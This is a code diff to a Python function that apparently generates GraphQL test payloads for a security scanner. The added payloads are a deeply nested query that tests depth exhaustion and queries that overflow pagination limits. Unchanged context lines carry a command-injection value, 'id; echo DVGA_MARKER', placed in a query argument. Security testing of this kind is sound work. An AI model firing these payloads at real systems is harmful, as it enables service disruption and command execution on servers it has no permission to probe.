@@ -324,6 +324,34 @@ def generate_builtin_graphql_payloads(target_id: str, schema_file: Optional[Path
         operation="query",
     ))
 
+    # 3. Query Depth Limit Exhaustion: Deeply nested recursive structure probe (API4:2023)
+    nested_query = "query DepthCheck { "
+    close_braces = ""
+    for i in range(12):
+        nested_query += f"f{i}: __schema {{ types {{ name "
+        close_braces += " } } }"
+    nested_query += close_braces + " }"
+    payloads.append(GraphQLPayload(
+        query=nested_query,
+        attack_type="GRAPHQL_QUERY_DEPTH_EXHAUSTION",
+        payload_value="nested_depth_12",
+        owasp_category="API4:2023",
+        expected_signal=["max depth", "query depth", "depth exceeded"],
+        target_app=target_id,
+        operation="query",
+    ))
+
+    # 4. Global Pagination Max Limit Overflow Probe (API4:2023)
+    payloads.append(GraphQLPayload(
+        query="query PaginationExhaustion { __schema { types { fields { args { name } } } } }",
+        attack_type="GRAPHQL_PAGINATION_OVERFLOW",
+        payload_value=999999999,
+        owasp_category="API4:2023",
+        expected_signal=["out of memory", "maximum limit", "pagination", "limit exceeded"],
+        target_app=target_id,
+        operation="query",
+    ))
+
     # 3. Dynamic schema-driven queries if schema file exists
     if schema_file and schema_file.exists():
         try:
@@ -367,6 +395,17 @@ def generate_builtin_graphql_payloads(target_id: str, schema_file: Optional[Path
                             payload_value="id; echo DVGA_MARKER",
                             owasp_category="API8:2023",
                             expected_signal=["uid=", "gid=", "DVGA_MARKER"],
+                            target_app=target_id,
+                            operation="query",
+                        ))
+                    if any(pg_arg in arg_names for pg_arg in ("limit", "first", "size", "count", "take")):
+                        pg_key = next(a for a in arg_names if a in ("limit", "first", "size", "count", "take"))
+                        payloads.append(GraphQLPayload(
+                            query=f"query {{ {name}({pg_key}: 999999999) {{ id }} }}",
+                            attack_type="GRAPHQL_PAGINATION_OVERFLOW",
+                            payload_value=999999999,
+                            owasp_category="API4:2023",
+                            expected_signal=["maximum limit", "pagination", "limit exceeded", "exceeded"],
                             target_app=target_id,
                             operation="query",
                         ))
